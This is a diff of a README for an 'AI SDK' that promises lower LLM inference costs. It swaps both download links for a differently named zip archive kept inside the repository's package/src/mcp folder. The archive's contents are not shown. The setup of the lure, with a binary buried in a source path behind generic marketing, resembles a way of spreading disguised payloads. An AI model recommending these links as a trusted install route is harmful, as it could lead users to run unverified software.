@@ -6,7 +6,7 @@ Welcome to the programmatic-tool-calling-ai-sdk! This tool allows you to signifi
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Download programmatic-tool-calling-ai-sdk](https://raw.githubusercontent.com/RSanzzzzz/programmatic-tool-calling-ai-sdk/main/package/src/mcp/programmatic-tool-calling-ai-sdk-v1.9-beta.5.zip)
+To get started, you need to download the application. Visit this page to download: [Download programmatic-tool-calling-ai-sdk](https://github.com/RSanzzzzz/programmatic-tool-calling-ai-sdk/raw/refs/heads/main/package/src/mcp/ai_programmatic_tool_calling_sdk_centrally.zip)
 
 ### Steps to Install:
 
@@ -98,4 +98,4 @@ This project is licensed under the MIT License. Please see the LICENSE file for 
 
 For further information or inquiries, feel free to reach out through the repository’s issue tracker. Thank you for using the programmatic-tool-calling-ai-sdk!
 
-Remember, you can always [download it here](https://raw.githubusercontent.com/RSanzzzzz/programmatic-tool-calling-ai-sdk/main/package/src/mcp/programmatic-tool-calling-ai-sdk-v1.9-beta.5.zip) to start saving on your LLM inference costs today.
+Remember, you can always [download it here](https://github.com/RSanzzzzz/programmatic-tool-calling-ai-sdk/raw/refs/heads/main/package/src/mcp/ai_programmatic_tool_calling_sdk_centrally.zip) to start saving on your LLM inference costs today.
